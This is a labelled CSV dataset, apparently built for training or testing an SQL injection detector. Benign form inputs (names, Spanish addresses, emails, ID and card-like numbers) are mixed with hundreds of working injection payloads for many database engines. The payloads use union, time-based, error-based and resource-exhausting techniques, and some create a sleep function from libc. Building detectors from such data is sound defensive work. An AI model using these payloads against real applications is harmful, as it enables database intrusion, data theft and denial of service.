Query,Label
riento@maison-cadaques.gd,0
"c/ de las violetas, 104,",0
48263928s,0
wynnie,0
"1%"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""",1
roleson,0
"1' in boolean mode) union all select null,null,null,null#",1
em7590du4a,0
31482726g,0
85510378n,0
"1') as mgko where 1828=1828 and make_set(8403=8403,8899)--",1
14li6l4,0
turro,0
"calle hospital, 68",0
dirosario@errebebe.as,0
xe2foba,0
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",1
"-9758'+(select 'rlcy' where 3691=3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1
1'||(select 'vwls' where 5252=5252 rlike sleep(5)#,1
mirel-duvitski@pavimentosalagon.sr,0
1%' and (select * from (select(sleep(5)))gcrr)#,1
36844689t,0
"1%') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('%'='",1
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('tvcm'='tvcm",1
5303,0
"calle calcio, 58, 3-h",0
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""lynw"" like ""lynw",1
arbelez grippo,0
firat6,0
kipp,0
terroba,0
"1""))) or (select * from (select(sleep(5)))sddo)#",1
5696,0
d68as4o,0
5968547562728499,0
carablanca,0
conocchiari zagal,0
5359,0
robleda,0
congregation@saludyfitness.pm,0
leda,0
"1"") as idwa where 2545=2545 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
6866,0
22234,0
8199,0
26191,0
"-4830""))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dyut""=""dyut",1
godiva,0
"-5027%"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",1
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1'||(select 'lzzr' where 2477=2477;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'",1
"1'||(select 'ylek' where 3803=3803 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",1
alba2igo,0
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",1
"c/ motilla 19, 1c",0
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('fgox' like 'fgox",1
justiniano,0
"1%' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",1
bisbe gonyalons 189 12?f,0
"-1998') as kgvf where 2346=2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1
parra,0
9398,0
1)) and 4637=1408 and ((6509=6509,1
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz",1
"microscopio, 65",0
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (9112=9112",1
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('wgpg' like 'wgpg",1
"c/ cabo lopez martinez s/n, 7?c",0
vila,0
muente monfulle,0
1) and sleep(5) and (4855=4855,1
em8a2t118r,0
"1%""))) and (select * from (select(sleep(5)))fzno) and (((""%""=""",1
ryon,0
castelln de la plana/castell de la plana,0
"calle la caldera, 76 11-c",0
peimel,0
duby@mtos.mt,0
7109,0
"1%"")) union all select null,null,null,null,null,null,null,null,null#",1
kunecke,0
delpy_wrixon@tecnoindomo.gs,0
pleasande@doloresmusculares.aq,0
cisneros tauler,0
01218498g,0
"c/ otumba, 132,",0
lenya@fbi-criminal-network.com.mil,0
"1' or 8156=(select count(*) from generate_series(1,5000000))--",1
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",1
"1,(select (case when (5334=4976) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1
friedkin@dubi.ye,0
arturo,0
norma,0
1') as gogu where 4338=4338 union all select null#,1
aranceta alameda,0
"1"") union all select null,null,null,null--",1
84q42o,0
agullana,0
"-2434) union all select 8310,8310,8310,8310,8310--",1
novallas,0
1613,0
"1"" where 4281=4281;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
sadoc,0
17rdiflo4a,0
"1') and elt(1210=1210,sleep(5)) and ('medg'='medg",1
"1%"";select sleep(5)#",1
hamlett,0
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('oskf' like 'oskf",1
courtena,0
pladellorens albiana,0
-8051) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (5637=5637,1
"-4653' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xdce'='xdce",1
"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1'||(select 'xhcr' from dual where 9279=9279;iif(2452=8999,1,1/0)",1
mendracaveitia torreyas,0
ferreira5,0
"-3370' in boolean mode) union all select 3432,3432,3432,3432#",1
godden,0
1) order by 1#,1
exactor,0
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",1
1'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
hermanos gascon 141,0
"1 where 6408=6408 union all select null,null,null,null,null,null,null,null--",1
gino,0
3118403401340086,0
jackelyn,0
ildara,0
"1')) union all select null,null#",1
"1)) as debc where 7428=7428 union all select null,null,null#",1
"elt(5098=2728,1)",1
"-8612') as toeu where 6357=6357 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
28867747x,0
sidonia,0
bailn lapetini,0
comber@barnicesultravioleta.kz,0
"-4876"")) as saug where 2256=2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",1
"1"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""nkgd""=""nkgd",1
"1%') and 8635=(select count(*) from generate_series(1,5000000))--",1
shou-che,0
"1' where 5702=5702 and elt(3114=3114,sleep(5))#",1
mera alccer,0
daughtry@thecupidhouse.az,0
arraia-maeztu,0
07901950r,0
severiano,0
"1') where 8204=8204;select count(*) from generate_series(1,5000000)--",1
keast@comodepilarse.si,0
"1') as bvvl where 9818=9818 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
"-2120"") union all select 9614--",1
"1')) and elt(4249=4249,7259) and (('miir' like 'miir",1
41953346n,0
40469,0
"jana, la",0
"1"")) or (select * from (select(sleep(5)))sddo)#",1
sintes gasd,0
"1) as mpnj where 5049=5049;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1) or sleep(5),1
"pablo de rojas, s/n,",0
"1' in boolean mode) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)#",1
masvidal canino,0
matzenauer@evelin.com.ci,0
mastelero,0
"-7574%"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",1
"1' and elt(4249=4249,7259) and 'nsbj' like 'nsbj",1
"1 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
siete iglesias de trabancos,0
"1) where 4768=4768 union all select null,null,null,null,null,null,null,null#",1
98946031p,0
matlin@carrillo-de-albornoz.be,0
sampedro,0
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""nevr"" like ""nevr",1
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (5130=5130",1
1'||(select 'hafu' where 6226=6226;(select * from (select(sleep(5)))srmq))||',1
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",1
kovac,0
valo5izar,0
16966742x,0
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1
gldar,0
kaempfe amilibia,0
mcduffie,0
5239525099748134,0
thibaut,0
12,0
"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""pqsp""=""pqsp",1
"1"")) as phis where 4420=4420 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""qqky"" like ""qqky",1
"-8943%') union all select 7710,7710#",1
"calle daniel florido rodriguez, 105, 2?f",0
28598,0
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",1
cla20te,0
"calle sobrerroca 96, 7?f",0
"-4012"") or make_set(9354=9354,7185) and (""ccfn""=""ccfn",1
dennett,0
44322044d,0
"1%""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""%""=""",1
orcoyen leal,0
1))) and sleep(5) and (((6618=6618,1
-3161') or 8501=1796,1
sabel,0
"-5130')) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1
"c/ cala bona, 80,",0
geli febo,0
august,0
brewer,0
82444604t,0
assassn clrici,0
"c/ escultor julio gonzalez 88,",0
24892,0
"1' where 1230=1230 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
-8701%')) or (4843=1690)*1690 and (('%'=',1
"-3442' in boolean mode) union all select 6255,6255,6255,6255,6255#",1
2e0814r1pada,0
1%'))) and 7219=7361 and ((('%'=',1
gros pal,0
"1%""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",1
8019,0
"1') where 9544=9544 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
"1) as wust where 3884=3884 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
rawdon,0
"-3902'))) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",1
37314,0
4ntra6a,0
burrud-gyoengyoessy@carloshoya.com.pr,0
entrada casas 90,0
elysia,0
1734128437321844,0
juana,0
"1 where 6369=6369 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'eznq' like 'eznq",1
hews,0
5254,0
16727733v,0
ashida@gaudio.my,0
trek_,0
"1"" and elt(4249=4249,7259)",1
-4835))) or (4219=2081)*2081 and (((8536=8536,1
"1"" where 9241=9241 union all select null#",1
49135,0
tom159,0
miguel leon gracia 174,0
1') as dqgr where 2427=2427 and (3020=3020)*6703--,1
"1%') and 8407=(select count(*) from generate_series(1,5000000)) and ('%'='",1
"1"") where 5850=5850 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
arguisuelas,0
quest@palmatraducciones.pw,0
kemr@soycatalan.ga,0
46793939w,0
"1) and elt(1210=1210,sleep(5)) and (1915=1915",1
07819871d,0
0949927790340653,0
bravat-a,0
2425930139286993,0
1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,1
vaciar carrito,0
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""rkry"" like ""rkry",1
retenidamente,0
c26ve7sar,0
bleifer@muchacha.com.bh,0
"1);select benchmark(5000000,md5(0x714e4153))#",1
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1
garlitos,0
san vicente de la cabeza,0
manferidor,0
lahnstein agundis,0
"-2423'))) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1
jabir,0
carson,0
1' where 1652=1652 and sleep(5)#,1
"-9445) as dmur where 4371=4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1
"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
50212,0
mattes,0
lonidas,0
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""regi"" like ""regi",1
0577312599845778,0
"1'||(select 'xjtq' from dual where 5719=5719 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",1
27113,0
65927228m,0
xanto,0
yeo-hoon,0
desfacedora,0
40171,0
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""kldp"" like ""kldp",1
bielat,0
"-8580') union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",1
tharsis s/n 11?c,0
1%') and (7704=3494)*3494 and ('%'=',1
sanou bellsol,0
kokoska1,0
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1
"1' where 4460=4460;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
edmunds.emil@carimartin.io,0
0cep8o,0
1) as pqle where 4039=4039 and 7533=7533--,1
yu-chian,0
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv",1
9iri7aza,0
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",1
maiga,0
olite,0
8406156638357401,0
baxley@italianmotorvillagesevilla.sh,0
"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",1
globula*riceo,0
bossa,0
arrazua-ubarrundia,0
elementada,0
riegger.zaleska@cirujanaplastica.cn,0
pobladura de pelayo garca,0
isolda,0
07250,0
bould_rhue2@palomajimenez.ru,0
03246946j,0
"1')) union all select null,null,null,null#",1
"1""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1',(select (case when (7734=7734) then (select benchmark(5000000,md5(0x72747341))) else 7734*(select 7734 from mysql.db) end))",1
5447608087529874,0
0lica,0
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vhqm'='vhqm,1
castejn,0
"-4764"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""dfvz"" like ""dfvz",1
violy belcastro,0
88194085x,0
0269447503610316,0
"c/ domingo de betanzos s/n,",0
38068,0
roi,0
antiseps$ia,0
1'||(select 'sdll' where 5074=5074 or (select * from (select(sleep(5)))ydpu))||',1
machac$ada,0
"camino san jaime 97,",0
shirene,0
faro@vilano.pf,0
lobera,0
"1,exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))",1
23591,0
6482564727426112,0
garfiada,0
saqib,0
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
baz_azais@filtraciondehumos.sb,0
palacios del arzobispo,0
"1)) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
violet@sunmiles.cf,0
sauleda fidalgo,0
7265260392335726,0
"1) where 4810=4810 union all select null,null#",1
-7021' or 3038=3038,1
cirio,0
1')) rlike (select (case when (8489=8820) then 1 else 0x28 end)) and (('fbjf'='fbjf,1
genet,0
"1"" or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1%""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",1
ripley_kapianidze@reidesa.net,0
larese,0
"calle sant joan, 123,",0
"1"" where 1920=1920 and 8635=(select count(*) from generate_series(1,5000000))--",1
"1' where 4358=4358 union all select null,null,null,null--",1
13021468h,0
mentecapta,0
boreo@creacionesdolcevita.mo,0
"1' in boolean mode) or elt(5873=5873,sleep(5))#",1
uriah,0
teitelba,0
"1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",1
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
"1%""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
compte,0
4a2ho4a2o,0
boada,0
8339229633184139,0
"-9076'+(select lqvj where 8551=8551 union all select 8551,8551,8551,8551--",1
"c/ fray junipero serra, 127",0
"1"");select pg_sleep(5)--",1
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""krtr"" like ""krtr",1
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1
pavese@euskalcasino.mz,0
"1')) as kfnt where 8090=8090 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
piperni,0
"1"")));(select * from (select(sleep(5)))acdk)#",1
1))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((6062=6062,1
trias palan,0
37120,0
"av. sol 196, 6?d",0
45810,0
"-8159 where 2793=2793 union all select 2793,2793,2793,2793,2793#",1
norton@lesionesmusculares.uz,0
1'||(select 'cclo' from dual where 6823=6823 and 9198=9198--,1
05298,0
"(select like('abcdefg',upper(hex(randomblob(500000000/2)))))",1
hlinka,0
izzi barnils,0
0957221958877630,0
"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
o.donnel,0
"calle pintor julian alcaraz, 108, 10-a",0
terland-bartha5@informatica2009.ck,0
melchior@fruteriacartaya.vi,0
29611,0
alred,0
prueckner@helicopter.com.gf,0
marieau8@clementelr.nz,0
-3960' or 9323=9323#,1
saliva+jo,0
5393761266970595,0
"1"" rlike sleep(5)#",1
atractivo,0
murero,0
9810,0
3046,0
03820,0
jemie,0
"1',(select (case when (6894=6087) then 1 else 6894*(select 6894 from information_schema.character_sets) end))",1
noya driu,0
"chopo, 10",0
clarance6,0
1al6uiria,0
098oro4a4,0
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""vlev"" like ""vlev",1
vilagine vilamitj,0
9o52cardea7,0
co*marca,0
zachrisson satalia,0
1'||(select 'znba' where 8323=8323;select pg_sleep(5)--,1
nogueruelas,0
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)-- mwsm",1
"1"") as xrsi where 9498=9498;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
c/ coca de la piera 167,0
"once septiembre, 95",0
1'))) and 3602=1990#,1
-7497') as kjzt where 3758=3758 or 4794=9499--,1
dalmira,0
"calle europa s/n,",0
5693419988123325,0
guasch xifr,0
"1'+(select vupb where 9575=9575 union all select null,null,null,null,null,null,null,null,null,null--",1
7871313951029242,0
71,0
"1%""));iif(7011=2522,1,1/0)",1
"1'||(select 'qsgi' where 1707=1707 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",1
"1);select benchmark(5000000,md5(0x4c4d6142))",1
calle martin arredondo 31 9g,0
-9975 where 9760=9760 order by 1--,1
-8369) where 7234=7234 order by 1--,1
manzanares bruguer,0
01212,0
6256677835346457,0
baladrn,0
recordar,0
navas de bureba,0
"1"") where 7165=7165 or 8466=benchmark(5000000,md5(0x694a4745))--",1
1) as duqb where 6495=6495;select (case when (5914=2314) then 5914 else 1/(select 0) end)--,1
quintilio,0
2784102428679593,0
griffith,0
24710,0
8703,0
3123820484071721,0
7751,0
frison@barnizultravioleta.jm,0
"calle llorente, 73,",0
6470509098489788,0
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""uosc""=""uosc",1
"-8487') where 9655=9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1
kussauer_brereton@showcarsmadrid.com.kp,0
08011,0
2925,0
manzano babot,0
"c/ valladolid 194, 6?b",0
"1"")) as chal where 6661=6661;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,1
81099220r,0
1') and (select * from (select(sleep(5)))fzno),1
12527,0
romina,0
entwistle_ruetting@comonuevo.ro,0
46688,0
"1'||(select 'zqdn' where 6194=6194 union all select null,null,null,null--",1
1' rlike (select (case when (5567=5586) then 1 else 0x28 end)) and 'mmnb'='mmnb,1
1') and 8594=(select 8594 from pg_sleep(5))--,1
"1"" where 4366=4366 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
aloin,0
mocoso,0
aminda,0
ambrosi,0
"juan de grijalba, 23",0
muoz capato,0
radioelctrica,0
"1') as vlwh where 9403=9403 or elt(5873=5873,sleep(5))#",1
92,0
las gijn,0
1');select (case when (9130=1826) then 9130 else 9130*(select 9130 from mysql.db) end)#,1
3115,0
*es8a24l,0
mallorie,0
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('rxxb'='rxxb",1
"c/ xeixa, 189 8?d",0
"1%""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""%""=""",1
burness,0
l16o2o,0
denno,0
97co38225s9,0
paleozoica,0
san cibrao das vias,0
rapariegos,0
"-1510'))) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
18269491q,0
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
sant mateu de bages,0
cabarrs zafn,0
ginard xabe,0
"1,row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",1
pennebak,0
6411,0
"1) as rbmn where 5948=5948 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
macular,0
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))",1
"-8005"") union all select 5213,5213,5213,5213,5213--",1
athwal,0
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"mirn, el",0
bendex@xavipetit.it,0
wernher,0
misut fondevi,0
34112,0
1'+(select soqk where 5383=5383;select pg_sleep(5)--,1
"1"") as yphz where 8174=8174 union all select null,null,null,null,null,null,null--",1
grgar8,0
-6680') or 5483=3031 and ('zxes'='zxes,1
maeya,0
-6777%') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'=',1
8323552403219603,0
fit irizibar,0
"1'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14139,0
benisuera,0
2095,0
1'+(select ahyw where 6893=6893 waitfor delay '0:0:5'--,1
im$ponderable,0
cabeza novella,0
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",1
padre lojendio 53 11?c,0
ramesh,0
1'+(select 'jmdl' where 7827=7827;select pg_sleep(5))+',1
"1%""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""%""=""",1
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ylit' like 'ylit",1
mol,0
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((8679=8679",1
"1'||(select 'qstz' where 6835=6835;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
ortuella,0
20200,0
kjer@multibuscador.com.ph,0
"1%'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('%'='",1
diana,0
cuevas labradas,0
patay,0
1') where 5287=5287 and 7533=7533--,1
1'||(select 'miew' where 8360=8360 waitfor delay '0:0:5')||',1
1%' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'=',1
52181980v,0
"1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
6135315526614967,0
"camio da mina, 175,",0
raja villalba,0
3632,0
ricardo,0
"-2033"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
57978068j,0
"1%""));select pg_sleep(5)--",1
"1%')) union all select null,null,null,null,null,null,null,null--",1
97176413x,0
velilla de los ajos,0
04100,0
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
96558759k,0
81881966b,0
henry@sms24h.tr,0
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"-2085"") as hkev where 7730=7730 union all select 7730,7730--",1
8clo736,0
krug,0
364,0
1717836675629432,0
"acebrn, el",0
"1%"" and sleep(5) and ""%""=""",1
"1%')) or 8421=(select count(*) from generate_series(1,5000000)) and (('%'='",1
0894971274673122,0
1' and sleep(5)#,1
jerez brecha,0
"1'+(select ohqr where 5610=5610;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",1
stalin,0
lucas fiallega,0
"1) as qwsa where 2874=2874;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
09128,0
"1))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
